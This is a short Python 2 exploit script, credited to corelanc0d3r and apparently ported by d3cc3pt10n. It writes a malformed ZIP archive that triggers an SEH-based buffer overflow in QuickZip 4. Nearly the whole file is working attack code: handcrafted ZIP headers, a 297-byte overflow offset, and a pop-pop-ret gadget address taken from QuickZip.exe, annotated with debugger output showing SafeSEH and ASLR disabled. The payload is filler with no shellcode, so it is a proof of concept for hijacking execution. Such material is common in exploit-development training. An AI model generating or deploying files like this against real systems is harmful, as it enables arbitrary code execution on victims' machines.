#!/usr/bin/env python
# Original Author : corelanc0d3r
# Pocython Author: d3cc3pt10n
# Note: Python 3 doesn't work, Python 2 does...weird!

from struct import pack

filename = 'pycorelanboom.zip'
filesize = '\xe4\x0f'

# Local file header
# 30 bytes
ldf_header = (
        "\x50\x4B\x03\x04"
        "\x14\x00\x00\x00"
        "\x00\x00\xB7\xAC"
        "\xCE\x34\x00\x00"
        "\x00\x00\x00\x00"
        "\x00\x00\x00\x00"
        "\x00"
        + filesize +          # file size 4068
        "\x00"
        "\x00\x00")

# Central directory header
# 46 bytes
cdf_header = (
    "\x50\x4B\x01\x02"
    "\x14\x00\x14\x00"
    "\x00\x00\x00\x00"
    "\xB7\xAC\xCE\x34"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00"
    + filesize +
    "\x00\x00\x00\x00"
    "\x00\x00\x01\x00"
    "\x24\x00\x00\x00"
    "\x00\x00\x00\x00")

# End of file central directory header
# 22 bytes
eofcdf_header = (
    "\x50\x4B\x05\x06"
    "\x00\x00\x00\x00"
    "\x01\x00\x01\x00"
    "\x12\x10\x00\x00" # Size of central directory (bytes)
    "\x02\x10\x00\x00" # Offset of start of central directory,
                       # relative to start of archive
    "\x00\x00")

# payload_length = 4064 pattern + 4 .txt extension = 4068
#[+] Examining SEH chain
#    SEH record (nseh field) at 0x0012fbfc overwritten with normal pattern : 0x41396a41 (offset 297), followed by 1020 bytes of cyclic data after the handler
# Message=  0x00407a33 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [QuickZip.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\QuickZip4\QuickZip.exe)



# 4 byte jump
nseh = ('B' * 4)
# EIP
# < means little-endian
# L means unsigned long - 4 bytes
seh = pack('<L', 0x00407a33)
payload = ('A' * 297) + nseh + seh + ('D'*(4068 - 8 - 297))
payload_length = len(payload)

if payload_length != 4068:
    print("[!] Warning, payload size isn't correct!")

exploit = ldf_header + payload + cdf_header + payload + eofcdf_header

print("Size : {s}n".format(s=payload_length))
with open(filename, 'w') as f:
    f.write(exploit)
